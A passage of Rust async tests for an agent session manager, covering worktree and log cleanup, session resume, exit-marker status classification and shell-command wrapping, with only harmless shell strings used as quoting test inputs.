        // Stop + purge the source. The handoff session is still live and shares the
        // worktree, so the directory must survive.
        mgr.stop_session(&source.id.to_string(), true)
            .await
            .unwrap();

        assert!(
            std::path::Path::new(&wt_path).exists(),
            "worktree should survive while another live session references it"
        );
        assert!(
            mgr.get_session(&source.id.to_string())
                .await
                .unwrap()
                .is_none(),
            "purge always deletes the source row itself"
        );
    }

    #[tokio::test]
    async fn test_purge_session_cleans_solo_worktree() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let wt_tmp = tempfile::tempdir().unwrap();
        let wt_path = wt_tmp.path().to_str().unwrap().to_owned();

        let session = mgr.create_session(make_req("solo-task")).await.unwrap();
        sqlx::query("UPDATE sessions SET worktree_path = ? WHERE id = ?")
            .bind(&wt_path)
            .bind(session.id.to_string())
            .execute(mgr.store().pool())
            .await
            .unwrap();

        mgr.stop_session(&session.id.to_string(), true)
            .await
            .unwrap();

        assert!(
            !std::path::Path::new(&wt_path).exists(),
            "a solo (unshared) worktree must still be reclaimed on purge"
        );
    }

    #[tokio::test]
    async fn test_cleanup_dead_sessions_reclaims_shared_worktree_when_both_dead() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let wt_tmp = tempfile::tempdir().unwrap();
        let wt_path = wt_tmp.path().to_str().unwrap().to_owned();

        let a = mgr.create_session(make_req("plan-auth")).await.unwrap();
        let b = mgr.create_session(make_req("plan-auth-2")).await.unwrap();
        for id in [a.id, b.id] {
            sqlx::query("UPDATE sessions SET worktree_path = ?, status = 'done' WHERE id = ?")
                .bind(&wt_path)
                .bind(id.to_string())
                .execute(mgr.store().pool())
                .await
                .unwrap();
        }

        let result = mgr.cleanup_dead_sessions().await.unwrap();

        assert!(
            !std::path::Path::new(&wt_path).exists(),
            "worktree should be reclaimed once every referencing session is dead"
        );
        assert_eq!(result.sessions_deleted, 2);
    }

    #[tokio::test]
    async fn test_resume_lost_sessions_marks_historical_docker_sessions_lost() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        // Force-insert a historical docker-runtime session that looks active
        let session = Session {
            id: Uuid::new_v4(),
            name: "old-docker-active".into(),
            workdir: "/tmp".into(),
            command: "claude".into(),
            status: SessionStatus::Working,
            backend_session_id: Some("docker:pulpo-old-docker-active".into()),
            runtime: Runtime::Docker,
            created_at: Utc::now() - chrono::Duration::hours(1),
            ..Default::default()
        };
        mgr.store().insert_session(&session).await.unwrap();

        let resumed = mgr.resume_lost_sessions().await.unwrap();
        assert_eq!(resumed, 0);

        // The session is marked Lost instead of being re-created in tmux
        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Lost);
        let calls = backend.calls.lock().unwrap();
        assert!(!calls.iter().any(|c| c.starts_with("create:")));
        drop(calls);
    }

    // -- wrap_command edge cases --

    #[test]
    fn test_wrap_command_double_quotes() {
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command(
            "echo \"hello world\"",
            &id,
            "test",
            None,
            "/tmp",
            DEFAULT_DAEMON_PORT,
        );
        assert!(cmd.contains("echo \"hello world\""));
        assert!(cmd.contains("-l -c"));
    }

    #[test]
    fn test_wrap_command_backticks() {
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command(
            "echo `date`",
            &id,
            "test",
            None,
            "/tmp",
            DEFAULT_DAEMON_PORT,
        );
        assert!(cmd.contains("echo `date`"));
    }

    #[test]
    fn test_wrap_command_dollar_variables() {
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command(
            "echo $HOME $USER",
            &id,
            "test",
            None,
            "/tmp",
            DEFAULT_DAEMON_PORT,
        );
        assert!(cmd.contains("echo $HOME $USER"));
    }

    #[test]
    fn test_wrap_command_empty_string() {
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command("", &id, "test", None, "/tmp", DEFAULT_DAEMON_PORT);
        // Empty command is not a shell command, so gets the agent wrapper (exit-code
        // marker, no fallback shell/message — ADR 0009).
        assert!(cmd.contains("-l -c"));
        assert!(cmd.contains("ec=$?"));
        assert!(!cmd.contains("[pulpo] Agent exited"));
    }

    #[test]
    fn test_wrap_command_very_long() {
        let id = uuid::Uuid::new_v4();
        let long_cmd = "echo ".to_owned() + &"a".repeat(10_000);
        let cmd = wrap_command(&long_cmd, &id, "test", None, "/tmp", DEFAULT_DAEMON_PORT);
        assert!(cmd.contains(&"a".repeat(10_000)));
        assert!(cmd.contains("-l -c"));
    }

    #[test]
    fn test_is_shell_command_with_whitespace() {
        // Trailing whitespace in basename should be trimmed
        assert!(is_shell_command("bash "));
        assert!(is_shell_command("/bin/bash "));
    }

    #[test]
    fn test_is_shell_command_bash_with_args_is_not_shell() {
        // "bash -c 'cmd'" is not a bare shell — it's running a command
        assert!(!is_shell_command("bash -c 'echo hello'"));
    }

    // -- stop_session with purge on various statuses --

    #[tokio::test]
    async fn test_stop_purge_creating_session_succeeds() {
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();
        let id = session.id.to_string();
        // Force status to Creating
        sqlx::query("UPDATE sessions SET status = 'creating' WHERE id = ?")
            .bind(&id)
            .execute(&pool)
            .await
            .unwrap();
        // stop_session handles any status — stops backend then optionally purges
        mgr.stop_session(&id, true).await.unwrap();
        let fetched = mgr.get_session(&id).await.unwrap();
        assert!(fetched.is_none());
    }

    #[tokio::test]
    async fn test_stop_purge_lost_session_succeeds() {
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();
        let id = session.id.to_string();
        sqlx::query("UPDATE sessions SET status = 'lost' WHERE id = ?")
            .bind(&id)
            .execute(&pool)
            .await
            .unwrap();
        mgr.stop_session(&id, true).await.unwrap();
        let fetched = mgr.get_session(&id).await.unwrap();
        assert!(fetched.is_none());
    }

    #[tokio::test]
    async fn test_stop_purge_done_session_succeeds() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();
        let id = session.id.to_string();
        mgr.store()
            .update_session_status(&id, SessionStatus::Done, None)
            .await
            .unwrap();
        mgr.stop_session(&id, true).await.unwrap();
        let fetched = mgr.get_session(&id).await.unwrap();
        assert!(fetched.is_none());
    }

    // -- cleanup_dead_sessions --

    #[tokio::test]
    async fn test_cleanup_dead_sessions_empty() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let resp = mgr.cleanup_dead_sessions().await.unwrap();
        assert_eq!(resp.sessions_deleted, 0);
        assert_eq!(resp.worktrees_cleaned, 0);
    }

    #[tokio::test]
    async fn test_cleanup_dead_sessions_deletes_stopped_and_lost() {
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;

        let s1 = mgr
            .create_session(make_req("cleanup-stopped"))
            .await
            .unwrap();
        sqlx::query("UPDATE sessions SET status = 'done' WHERE id = ?")
            .bind(s1.id.to_string())
            .execute(&pool)
            .await
            .unwrap();

        let s2 = mgr.create_session(make_req("cleanup-lost")).await.unwrap();
        sqlx::query("UPDATE sessions SET status = 'lost' WHERE id = ?")
            .bind(s2.id.to_string())
            .execute(&pool)
            .await
            .unwrap();

        let resp = mgr.cleanup_dead_sessions().await.unwrap();
        assert_eq!(resp.sessions_deleted, 2);
        assert_eq!(resp.worktrees_cleaned, 0);

        assert!(mgr.get_session(&s1.id.to_string()).await.unwrap().is_none());
        assert!(mgr.get_session(&s2.id.to_string()).await.unwrap().is_none());
    }

    #[tokio::test]
    async fn test_cleanup_dead_sessions_preserves_active() {
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;

        let active = mgr.create_session(make_req("keep-active")).await.unwrap();
        let stopped = mgr.create_session(make_req("del-stopped")).await.unwrap();
        sqlx::query("UPDATE sessions SET status = 'done' WHERE id = ?")
            .bind(stopped.id.to_string())
            .execute(&pool)
            .await
            .unwrap();

        let resp = mgr.cleanup_dead_sessions().await.unwrap();
        assert_eq!(resp.sessions_deleted, 1);

        assert!(
            mgr.get_session(&active.id.to_string())
                .await
                .unwrap()
                .is_some()
        );
        assert!(
            mgr.get_session(&stopped.id.to_string())
                .await
                .unwrap()
                .is_none()
        );
    }

    #[tokio::test]
    async fn test_cleanup_dead_sessions_counts_worktrees() {
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;

        let s = mgr.create_session(make_req("wt-cleanup")).await.unwrap();
        sqlx::query(
            "UPDATE sessions SET status = 'done', worktree_path = '/nonexistent/path' WHERE id = ?",
        )
        .bind(s.id.to_string())
        .execute(&pool)
        .await
        .unwrap();

        let resp = mgr.cleanup_dead_sessions().await.unwrap();
        assert_eq!(resp.sessions_deleted, 1);
        assert_eq!(resp.worktrees_cleaned, 1);
    }

    #[tokio::test]
    async fn test_capture_off_by_default_skips_setup_logging() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        mgr.create_session(make_req("no-capture")).await.unwrap();
        let has_setup = backend
            .calls
            .lock()
            .unwrap()
            .iter()
            .any(|c| c.starts_with("setup_logging:"));
        assert!(!has_setup);
        // The logs directory is not even created when capture is off.
        let logs = std::path::Path::new(mgr.store().data_dir()).join("logs");
        assert!(!logs.exists());
    }

    #[tokio::test]
    async fn test_capture_on_sets_up_logging() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        let mgr = mgr.with_capture_session_output(true);
        mgr.create_session(make_req("with-capture")).await.unwrap();
        let has_setup = backend
            .calls
            .lock()
            .unwrap()
            .iter()
            .any(|c| c.starts_with("setup_logging:"));
        assert!(has_setup);
        let logs = std::path::Path::new(mgr.store().data_dir()).join("logs");
        assert!(logs.exists());
    }

    #[tokio::test]
    async fn test_cleanup_removes_dead_session_log_file() {
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;
        let s = mgr.create_session(make_req("with-log")).await.unwrap();
        // Simulate a captured log file for the session.
        let log_path = session_log_path(mgr.store().data_dir(), &s.id.to_string());
        std::fs::create_dir_all(log_path.parent().unwrap()).unwrap();
        std::fs::write(&log_path, b"agent output").unwrap();
        sqlx::query("UPDATE sessions SET status = 'lost' WHERE id = ?")
            .bind(s.id.to_string())
            .execute(&pool)
            .await
            .unwrap();

        let resp = mgr.cleanup_dead_sessions().await.unwrap();
        assert_eq!(resp.sessions_deleted, 1);
        assert_eq!(resp.logs_cleaned, 1);
        assert!(!log_path.exists());
    }

    #[tokio::test]
    async fn test_cleanup_sweeps_orphan_worktree_and_preserves_referenced() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let wt_base = worktrees_dir(mgr.store().data_dir());
        let orphan = wt_base.join("orphan-task");
        std::fs::create_dir_all(&orphan).unwrap();
        std::fs::write(orphan.join("big.bin"), b"node_modules").unwrap();

        // An active session that still references its worktree dir must be preserved.
        let kept_dir = wt_base.join("keep-active");
        std::fs::create_dir_all(&kept_dir).unwrap();
        let active = mgr.create_session(make_req("keep-active")).await.unwrap();
        sqlx::query("UPDATE sessions SET worktree_path = ? WHERE id = ?")
            .bind(kept_dir.to_string_lossy().into_owned())
            .bind(active.id.to_string())
            .execute(mgr.store().pool())
            .await
            .unwrap();

        let resp = mgr.cleanup_dead_sessions().await.unwrap();
        assert_eq!(resp.worktrees_cleaned, 1);
        assert!(!orphan.exists(), "orphan worktree should be removed");
        assert!(kept_dir.exists(), "referenced worktree must be preserved");
    }

    #[tokio::test]
    async fn test_cleanup_sweeps_orphan_session_log() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let logs_dir = std::path::Path::new(mgr.store().data_dir()).join("logs");
        std::fs::create_dir_all(&logs_dir).unwrap();
        // A {uuid}.log with no matching session row is an orphan.
        let orphan_log = logs_dir.join("44444444-4444-4444-4444-444444444444.log");
        std::fs::write(&orphan_log, b"stale").unwrap();
        // The rolling daemon log must never be swept.
        let daemon_log = logs_dir.join("pulpod.log.2026-06-07-12");
        std::fs::write(&daemon_log, b"keep").unwrap();

        let resp = mgr.cleanup_dead_sessions().await.unwrap();
        assert_eq!(resp.logs_cleaned, 1);
        assert!(!orphan_log.exists());
        assert!(daemon_log.exists());
    }

    #[tokio::test]
    async fn test_purge_session_removes_log_file() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let s = mgr.create_session(make_req("purge-log")).await.unwrap();
        let log_path = session_log_path(mgr.store().data_dir(), &s.id.to_string());
        std::fs::create_dir_all(log_path.parent().unwrap()).unwrap();
        std::fs::write(&log_path, b"out").unwrap();

        mgr.stop_session(&s.id.to_string(), true).await.unwrap();
        assert!(!log_path.exists());
        assert!(mgr.get_session(&s.id.to_string()).await.unwrap().is_none());
    }

    #[tokio::test]
    async fn test_cleanup_dead_sessions_emits_deleted_events() {
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;
        let (event_tx, mut event_rx) = broadcast::channel(16);
        let mgr = mgr.with_event_tx(event_tx, "test-node".into());

        let s = mgr.create_session(make_req("evt-cleanup")).await.unwrap();
        let _ = event_rx.recv().await; // drain create event
        sqlx::query("UPDATE sessions SET status = 'done' WHERE id = ?")
            .bind(s.id.to_string())
            .execute(&pool)
            .await
            .unwrap();

        let resp = mgr.cleanup_dead_sessions().await.unwrap();
        assert_eq!(resp.sessions_deleted, 1);

        let event = event_rx.recv().await.unwrap();
        assert!(matches!(event, PulpoEvent::SessionDeleted(_)));
    }

    // -- resume_session emits event --

    #[tokio::test]
    async fn test_resume_session_emits_event() {
        let (mgr, _, pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let (event_tx, mut event_rx) = broadcast::channel(16);
        let mgr = mgr.with_event_tx(event_tx, "test-node".into());
        let session = mgr.create_session(make_req("resume-evt")).await.unwrap();
        let _ = event_rx.recv().await; // drain create event
        let id = session.id.to_string();
        sqlx::query("UPDATE sessions SET status = 'lost' WHERE id = ?")
            .bind(&id)
            .execute(&pool)
            .await
            .unwrap();
        let _resumed = mgr.resume_session(&id).await.unwrap();
        let event = event_rx.recv().await.unwrap();
        let se = unwrap_session_event(event);
        assert_eq!(se.status, "working");
        assert_eq!(se.previous_status.as_deref(), Some("lost"));
    }

    // ───────────────────────────────────────────────────────────
    // Exit-marker classification: Stopped vs Lost (fix/lifecycle-truth)
    // ───────────────────────────────────────────────────────────

    #[tokio::test]
    async fn test_dead_backend_with_code_marker_resolves_stopped_with_exit_code() {
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr.create_session(make_req("code-marker")).await.unwrap();
        let data_dir = mgr.store().data_dir().to_owned();
        let code_path = exit_code_marker_path(&data_dir, &session.id.to_string());
        std::fs::create_dir_all(code_path.parent().unwrap()).unwrap();
        std::fs::write(&code_path, "0").unwrap();

        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Done);
        assert_eq!(fetched.exit_code, Some(0));
    }

    #[tokio::test]
    async fn test_dead_backend_with_clean_marker_only_resolves_stopped_no_exit_code() {
        // Bare-shell spawns only ever get a `.clean` marker (no `.code`) — the
        // exit_code stays unset, but the classification must still be Stopped.
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr
            .create_session(make_req("clean-marker-only"))
            .await
            .unwrap();
        let data_dir = mgr.store().data_dir().to_owned();
        let clean_path = exit_clean_marker_path(&data_dir, &session.id.to_string());
        std::fs::create_dir_all(clean_path.parent().unwrap()).unwrap();
        std::fs::write(&clean_path, "").unwrap();

        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Done);
        assert!(fetched.exit_code.is_none());
    }

    #[tokio::test]
    async fn test_dead_backend_with_marker_prefers_log_tail_over_live_capture() {
        // Regression test: a `done` session's pane is gone by the time anything
        // resolves it (`wrap_command` closes it the instant the command exits —
        // ADR 0009), so a live tmux capture almost never reflects the session's
        // real final output — here it's the mock's default stale
        // `"test output"`. The pipe-pane log (written continuously while the pane
        // was alive) is the reliable source and must win.
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr.create_session(make_req("log-tail-wins")).await.unwrap();
        let data_dir = mgr.store().data_dir().to_owned();
        let id = session.id.to_string();

        let code_path = exit_code_marker_path(&data_dir, &id);
        std::fs::create_dir_all(code_path.parent().unwrap()).unwrap();
        std::fs::write(&code_path, "3").unwrap();

        let log_path = crate::session::utils::session_log_path(&data_dir, &id);
        std::fs::create_dir_all(log_path.parent().unwrap()).unwrap();
        std::fs::write(&log_path, "line one\nfinal output line\n").unwrap();

        let fetched = mgr.get_session(&id).await.unwrap().unwrap();
        assert_eq!(fetched.status, SessionStatus::Done);
        assert_eq!(fetched.exit_code, Some(3));
        assert_eq!(
            fetched.output_snapshot.as_deref(),
            Some("line one\nfinal output line")
        );
    }

    #[tokio::test]
    async fn test_concurrent_resolve_dead_backend_session_transitions_exactly_once() {
        // Regression test for a Fable review finding on PR #129: the watchdog's
        // eager `is_alive()` check and a concurrent `GET`/`list_sessions` call
        // (or another watchdog tick) could both observe the backend dead and both
        // transition + emit a `lifecycle.done` event for the very same session —
        // a duplicate. `transition_to_terminal_if_live`'s compare-and-set
        // (`WHERE status IN (...)`) must ensure only one of two concurrent
        // `resolve_dead_backend_session` calls actually performs the transition;
        // the loser must report `false` so its caller knows to skip emitting.
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr
            .create_session(make_req("concurrent-resolve"))
            .await
            .unwrap();
        let id = session.id.to_string();
        let data_dir = mgr.store().data_dir().to_owned();

        let code_path = exit_code_marker_path(&data_dir, &id);
        std::fs::create_dir_all(code_path.parent().unwrap()).unwrap();
        std::fs::write(&code_path, "0").unwrap();

        let store = mgr.store().clone();
        let backend = mgr.backend();
        let mut session_a = session.clone();
        let mut session_b = session.clone();

        let (result_a, result_b) = tokio::join!(
            resolve_dead_backend_session(&store, backend.as_ref(), &id, &mut session_a),
            resolve_dead_backend_session(&store, backend.as_ref(), &id, &mut session_b),
        );

        let transitioned = [result_a.unwrap(), result_b.unwrap()];
        assert_eq!(
            transitioned.iter().filter(|t| **t).count(),
            1,
            "exactly one of two concurrent resolves must report having transitioned \
             the session, got: {transitioned:?}"
        );

        let fetched = mgr.get_session(&id).await.unwrap().unwrap();
        assert_eq!(fetched.status, SessionStatus::Done);
        assert_eq!(fetched.exit_code, Some(0));
    }

    #[tokio::test]
    async fn test_session_with_backend_id_but_no_wrapper_and_no_marker_becomes_lost() {
        // Regression lock: a session with a `backend_session_id` present but never
        // spawned via `wrap_command` (so no exit marker for its id ever exists) must
        // still resolve to Lost when its backend dies — this should already pass given
        // the `has_exit_marker` false branch; it locks in that the marker-aware
        // classification doesn't change behavior for sessions with no wrapper.
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = Session {
            id: Uuid::new_v4(),
            name: "no-wrapper-external".into(),
            workdir: "/tmp".into(),
            command: "claude".into(),
            status: SessionStatus::Working,
            backend_session_id: Some("no-wrapper-external".into()),
            created_at: Utc::now() - chrono::Duration::hours(1),
            ..Default::default()
        };
        mgr.store().insert_session(&session).await.unwrap();

        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Lost);
        assert!(fetched.exit_code.is_none());
    }

    #[tokio::test]
    async fn test_resume_session_from_stopped_succeeds() {
        let (mgr, _, pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr
            .create_session(make_req("stopped-resume"))
            .await
            .unwrap();
        let id = session.id.to_string();
        sqlx::query("UPDATE sessions SET status = 'stopped' WHERE id = ?")
            .bind(&id)
            .execute(&pool)
            .await
            .unwrap();

        let resumed = mgr.resume_session(&id).await.unwrap();
        assert_eq!(resumed.status, SessionStatus::Working);
    }

    #[tokio::test]
    async fn test_resume_session_sets_up_logging_and_truncates_stale_log() {
        // Regression test: `recreate_backend_session` (via `resume_session`)
        // used to skip `setup_logging` entirely — a resumed session had no
        // per-session pipe-pane capture at all, so the next exit's fallback
        // read of `logs/<id>.log` (once the live tmux capture comes back
        // empty, as it almost always does for a clean exit) had nothing for
        // THAT run. And since `tmux pipe-pane -o 'cat >> path'` appends, a
        // stale log left over from the previous run must be truncated first —
        // otherwise the next exit's snapshot would mix both runs' output.
        let (mgr, backend, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let mgr = mgr.with_capture_session_output(true);
        let session = mgr
            .create_session(make_req("resume-log-truncate"))
            .await
            .unwrap();
        let id = session.id.to_string();

        let log_path = session_log_path(mgr.store().data_dir(), &id);
        if let Some(parent) = log_path.parent() {
            std::fs::create_dir_all(parent).unwrap();
        }
        std::fs::write(&log_path, b"stale output from the previous run\n").unwrap();

        mgr.store()
            .update_session_status(&id, SessionStatus::Done, None)
            .await
            .unwrap();

        backend.calls.lock().unwrap().clear();
        let resumed = mgr.resume_session(&id).await.unwrap();
        assert_eq!(resumed.status, SessionStatus::Working);

        let calls = backend.calls.lock().unwrap();
        assert!(
            calls.iter().any(|c| c.starts_with("setup_logging:")),
            "expected setup_logging call on resume, got: {calls:?}"
        );
        drop(calls);

        let contents = std::fs::read_to_string(&log_path).unwrap();
        assert!(
            contents.is_empty(),
            "the stale log from the previous run must be truncated on resume, got: {contents:?}"
        );
    }

    #[tokio::test]
    async fn test_resume_session_rejects_active_with_updated_message() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let session = mgr
            .create_session(make_req("active-resume-reject"))
            .await
            .unwrap();
        let err = mgr
            .resume_session(&session.id.to_string())
            .await
            .unwrap_err();
        let msg = err.to_string();
        assert!(msg.contains("cannot be resumed"), "got: {msg}");
        assert!(
            msg.contains("only done or lost sessions can be resumed"),
            "got: {msg}"
        );
    }

    #[tokio::test]
    async fn test_resume_session_rejects_creating_with_updated_message() {
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;
        let session = mgr
            .create_session(make_req("creating-resume-reject"))
            .await
            .unwrap();
        let id = session.id.to_string();
        sqlx::query("UPDATE sessions SET status = 'creating' WHERE id = ?")
            .bind(&id)
            .execute(&pool)
            .await
            .unwrap();
        let err = mgr.resume_session(&id).await.unwrap_err();
        assert!(
            err.to_string()
                .contains("only done or lost sessions can be resumed")
        );
    }

    #[tokio::test]
    async fn test_resume_lost_sessions_resolves_clean_exit_to_stopped_instead_of_resuming() {
        // Daemon-down ordering fix: the session ended cleanly (marker dropped directly,
        // simulating the wrapper having already run while pulpod was down) — the next
        // resume_lost_sessions pass (simulating a restart) must resolve it to Stopped
        // rather than blindly auto-resuming (re-launching the original command).
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        let session = mgr
            .create_session(make_req("daemon-down-clean"))
            .await
            .unwrap();
        let data_dir = mgr.store().data_dir().to_owned();
        let code_path = exit_code_marker_path(&data_dir, &session.id.to_string());
        std::fs::create_dir_all(code_path.parent().unwrap()).unwrap();
        std::fs::write(&code_path, "42").unwrap();

        *backend.alive.lock().unwrap() = false;
        backend.calls.lock().unwrap().clear();
        let resumed = mgr.resume_lost_sessions().await.unwrap();
        assert_eq!(
            resumed, 0,
            "a cleanly-exited session must not be auto-resumed"
        );

        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Done);
        assert_eq!(fetched.exit_code, Some(42));

        // No new backend session was created for it.
        let calls = backend.calls.lock().unwrap();
        assert!(!calls.iter().any(|c| c.starts_with("create:")));
        drop(calls);
    }

    #[tokio::test]
    async fn test_resume_purges_stale_exit_markers_before_recreating_backend() {
        // resume_session/resume_lost_sessions reuse the same session id when
        // recreating the backend (unlike create_session, which always mints a fresh
        // UUID). A stale marker left over from a *previous* run of this same id must
        // be purged before the backend is recreated — otherwise the next watchdog
        // idle-check tick would see it and immediately (and wrongly) treat the
        // freshly-resumed, genuinely-running session as already finished, since
        // check_session_idle's marker check does not consult backend aliveness.
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr
            .create_session(make_req("stale-marker-resume"))
            .await
            .unwrap();
        let id = session.id.to_string();
        let data_dir = mgr.store().data_dir().to_owned();
        let clean_path = exit_clean_marker_path(&data_dir, &id);
        std::fs::create_dir_all(clean_path.parent().unwrap()).unwrap();
        std::fs::write(&clean_path, "").unwrap();
        sqlx::query("UPDATE sessions SET status = 'lost' WHERE id = ?")
            .bind(&id)
            .execute(mgr.store().pool())
            .await
            .unwrap();
        assert!(has_exit_marker(&data_dir, &id));

        mgr.resume_session(&id).await.unwrap();

        assert!(
            !has_exit_marker(&data_dir, &id),
            "stale exit markers must be purged before the backend is recreated on resume"
        );
    }

    #[tokio::test]
    async fn test_resume_done_session_alive_with_exit_marker_recreates_backend() {
        // A `done` session's backend can in principle still answer alive (the
        // millisecond-scale race described in `resume_session`'s doc comment —
        // ADR 0009 removed the old, much longer `Ready`-with-alive-shell window,
        // but didn't remove the theoretical possibility outright). Resuming it must
        // not just flip status back to `working` and leave the stale backend/marker
        // in place — it must kill whatever's left and recreate the backend through
        // the resume path so the harness actually relaunches the agent.
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await; // alive by default
        let session = mgr
            .create_session(make_req("done-alive-marker"))
            .await
            .unwrap();
        let id = session.id.to_string();
        let data_dir = mgr.store().data_dir().to_owned();

        let code_path = exit_code_marker_path(&data_dir, &id);
        std::fs::create_dir_all(code_path.parent().unwrap()).unwrap();
        std::fs::write(&code_path, "0").unwrap();

        mgr.store()
            .update_session_status(&id, SessionStatus::Done, None)
            .await
            .unwrap();
        assert!(has_exit_marker(&data_dir, &id));

        backend.calls.lock().unwrap().clear();
        let resumed = mgr.resume_session(&id).await.unwrap();

        assert_eq!(resumed.status, SessionStatus::Working);
        let calls: Vec<_> = backend.calls.lock().unwrap().clone();
        assert!(
            calls.iter().any(|c| c.starts_with("kill:")),
            "leftover alive shell should be killed before recreating; calls: {calls:?}"
        );
        assert!(
            calls.iter().any(|c| c.starts_with("create:")),
            "backend should be recreated via the resume path; calls: {calls:?}"
        );
        assert!(
            !has_exit_marker(&data_dir, &id),
            "exit markers must be cleared once the backend is recreated"
        );
    }

    #[tokio::test]
    async fn test_resume_lost_session_dead_backend_with_marker_unchanged_behavior() {
        // Lost+dead is unaffected by the new alive+marker check: a dead backend
        // always recreates regardless of the exit marker, exactly as before.
        let (mgr, backend, pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr
            .create_session(make_req("lost-dead-marker"))
            .await
            .unwrap();
        let id = session.id.to_string();
        let data_dir = mgr.store().data_dir().to_owned();

        let code_path = exit_code_marker_path(&data_dir, &id);
        std::fs::create_dir_all(code_path.parent().unwrap()).unwrap();
        std::fs::write(&code_path, "0").unwrap();

        sqlx::query("UPDATE sessions SET status = 'lost' WHERE id = ?")
            .bind(&id)
            .execute(&pool)
            .await
            .unwrap();

        backend.calls.lock().unwrap().clear();
        let resumed = mgr.resume_session(&id).await.unwrap();

        assert_eq!(resumed.status, SessionStatus::Working);
        let calls: Vec<_> = backend.calls.lock().unwrap().clone();
        assert!(
            calls.iter().any(|c| c.starts_with("create:")),
            "dead backend should always be recreated regardless of exit marker; calls: {calls:?}"
        );
        assert!(!has_exit_marker(&data_dir, &id));
    }

    #[tokio::test]
    async fn test_handoff_session_from_stopped_source_succeeds() {
        // handoff_session has no status guard on the source today — a common real
        // path is now: session exits cleanly -> auto-Stopped -> user hands off to a
        // follow-up session. Lock this in as a regression test (don't add a guard).
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;
        let source = mgr.create_session(make_req("plan-auth")).await.unwrap();
        sqlx::query("UPDATE sessions SET status = 'stopped' WHERE id = ?")
            .bind(source.id.to_string())
            .execute(&pool)
            .await
            .unwrap();

        let handed_off = mgr
            .handoff_session(&source.id.to_string(), make_handoff_req())
            .await
            .unwrap();
        assert_eq!(handed_off.name, "plan-auth-2");
    }

    #[tokio::test]
    async fn test_stale_grace_period_delays_classification_then_resolves_stopped() {
        // Within the grace period, check_and_mark_stale must not fire at all — even
        // though a marker already exists (agent exited fast + user exited the shell
        // within the grace window). Once the window passes, the next check correctly
        // resolves Stopped (not Lost) using the marker that was there all along.
        let tmpdir = tempfile::tempdir().unwrap();
        let tmpdir = Box::leak(Box::new(tmpdir));
        let store = Store::new(tmpdir.path().to_str().unwrap()).await.unwrap();
        store.migrate().await.unwrap();
        let backend = Arc::new(MockBackend::new().with_alive(false));
        // Default stale_grace_secs (5s) — NOT with_no_stale_grace.
        let mgr = SessionManager::new(backend, store, None);

        let session = mgr.create_session(make_req("grace-window")).await.unwrap();
        let id = session.id.to_string();
        let data_dir = mgr.store().data_dir().to_owned();
        let code_path = exit_code_marker_path(&data_dir, &id);
        std::fs::create_dir_all(code_path.parent().unwrap()).unwrap();
        std::fs::write(&code_path, "0").unwrap();

        // Still within the grace period — no transition yet.
        let fetched = mgr.get_session(&id).await.unwrap().unwrap();
        assert_eq!(fetched.status, SessionStatus::Working);

        // Backdate created_at past the grace window and check again.
        sqlx::query("UPDATE sessions SET created_at = ? WHERE id = ?")
            .bind((Utc::now() - chrono::Duration::seconds(10)).to_rfc3339())
            .bind(&id)
            .execute(mgr.store().pool())
            .await
            .unwrap();

        let fetched = mgr.get_session(&id).await.unwrap().unwrap();
        assert_eq!(fetched.status, SessionStatus::Done);
        assert_eq!(fetched.exit_code, Some(0));
    }

    #[tokio::test]
    async fn test_purge_session_removes_exit_markers() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let s = mgr.create_session(make_req("purge-markers")).await.unwrap();
        let data_dir = mgr.store().data_dir().to_owned();
        let id = s.id.to_string();
        let code_path = exit_code_marker_path(&data_dir, &id);
        let clean_path = exit_clean_marker_path(&data_dir, &id);
